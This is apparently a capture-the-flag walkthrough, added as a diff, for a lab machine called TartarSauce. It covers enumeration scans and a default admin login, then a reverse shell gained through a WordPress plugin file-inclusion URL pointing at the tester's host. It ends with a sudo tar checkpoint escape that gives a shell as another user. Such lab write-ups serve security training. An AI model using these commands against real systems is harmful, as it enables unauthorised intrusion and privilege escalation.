@@ -1,0 +1,134 @@
+#TarTarSauce
+#WordPress Plugin Remote shell
+#WordPress RFI: https://www.exploit-db.com/exploits/38861
+#PHP ReverseShell: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+#RENAME: php-reverse-shell to wp-load.php                   
+#url to execute php script: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.124:4443/
+#ESCAPE From WWW-DATA Env via TAR
+#
+
+1-Enumeration:
+    └─$ nmap -T5 -sV -sC -Pn 10.129.1.185 -v
+        PORT   STATE SERVICE VERSION
+        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+        | http-methods: 
+        |_  Supported Methods: GET HEAD POST OPTIONS
+        |_http-server-header: Apache/2.4.18 (Ubuntu)
+        |_http-title: Landing Page
+        | http-robots.txt: 5 disallowed entries 
+        | /webservices/tar/tar/source/ 
+        | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
+        |_/webservices/developmental/ /webservices/phpmyadmin/
+
+
+    Port 80:
+        Web Server: Apache 2.4.18
+            Exploit version: https://www.exploit-db.com/exploits/46676
+
+
+        ★]$ nikto -h http://10.129.1.185:80:
+            + /robots.txt: contains 5 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+            + /: Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+            + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+            + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+
+            Robots.txt:
+                User-agent: *
+                    Disallow: /webservices/tar/tar/source/
+                    Disallow: /webservices/monstra-3.0.4/
+                    Disallow: /webservices/easy-file-uploader/
+                    Disallow: /webservices/developmental/
+                    Disallow: /webservices/phpmyadmin/
+
+
+
+        gobuster dir -u http://10.129.1.185:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+            /webservices          (Status: 301) [Size: 318] [--> http://10.129.1.185/webservices/]
+            /server-status        (Status: 403) [Size: 300]
+
+
+        http://10.129.1.185/webservices/monstra-3.0.4/:
+            Log In Page
+
+        └──╼ [★]$ gobuster dir -u http://10.129.1.185/webservices/monstra-3.0.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+                /public               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/public/]
+                /admin                (Status: 301) [Size: 338] [--> http://10.129.1.185/webservices/monstra-3.0.4/admin/]
+                /storage              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/storage/]
+                /plugins              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/plugins/]
+                /engine               (Status: 301) [Size: 339] [--> http://10.129.1.185/webservices/monstra-3.0.4/engine/]
+                /libraries            (Status: 301) [Size: 342] [--> http://10.129.1.185/webservices/monstra-3.0.4/libraries/]
+                /tmp                  (Status: 301) [Size: 336] [--> http://10.129.1.185/webservices/monstra-3.0.4/tmp/]
+                /boot                 (Status: 301) [Size: 337] [--> http://10.129.1.185/webservices/monstra-3.0.4/boot/]
+                /backups              (Status: 301) [Size: 340] [--> http://10.129.1.185/webservices/monstra-3.0.4/backups/]
+
+
+        http://10.129.1.185/webservices/monstra-3.0.4/admin/:
+            Login Form
+
+            admin admin: WORKS !
+
+            Username 	Email 	Registered 	Role 	
+            admin 	test@test.local 	22.2.2018 	Admin 
+
+        monstra-3.0.4 exploit: https://www.exploit-db.com/exploits/52038 - Monstra CMS 3.0.4 - Remote Code Execution (RCE) 
+                                https://www.exploit-db.com/exploits/48479 one liner shell + php7 extension
+
+        ##############################################REVERSE SHELL #########################################################
+
+
+        ##############################################REVERSE SHELL #########################################################
+        WordPress Exploit for Remote shell:
+            WordPress RFI: https://www.exploit-db.com/exploits/38861
+
+            PHP ReverseShell: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+            RENAME: php-reverse-shell to wp-load.php
+                    
+            url to execute php script: http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.124:4443/
+
+
+            WE HAVE A SHELL:
+                $ which python
+                    /usr/bin/python
+
+                $ python -c 'import pty; pty.spawn("/bin/bash")'
+
+                www-data@TartarSauce:/dev/shm$ sudo -l
+                    sudo -l
+                    Matching Defaults entries for www-data on TartarSauce:
+                        env_reset, mail_badpass,
+                        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+                    User www-data may run the following commands on TartarSauce:
+                        (onuma) NOPASSWD: /bin/tar
+
+
+
+                Sudo Command Permissions:
+                The key line is:
+                    User www-data may run the following commands on TartarSauce:
+                        (onuma) NOPASSWD: /bin/tar
+
+                Explanation:
+                (onuma): Specifies the user under whose privileges the command can be executed. In this case, www-data can run the command as the onuma user.
+                NOPASSWD: Indicates that no password is required to run the command with sudo.
+                /bin/tar: The specific command www-data is allowed to execute with sudo.
+                Implications
+                The www-data user can execute the tar command as the onuma user without providing a password.
+                Risk: This could be exploited to gain elevated privileges, depending on how the tar command is used.
+
+
+                Escape from restricted env via TAR:
+                    www-data@TartarSauce:/dev$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+                    < /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh        
+                    /bin/tar: Removing leading `/' from member names
+
+                    $ python -c 'import pty; pty.spawn("/bin/bash")'
+                    python -c 'import pty; pty.spawn("/bin/bash")'
+
+                    onuma@TartarSauce:/dev$ cd ..
+                    cd ..
+                    onuma@TartarSauce:/$ 
+
+
+                    
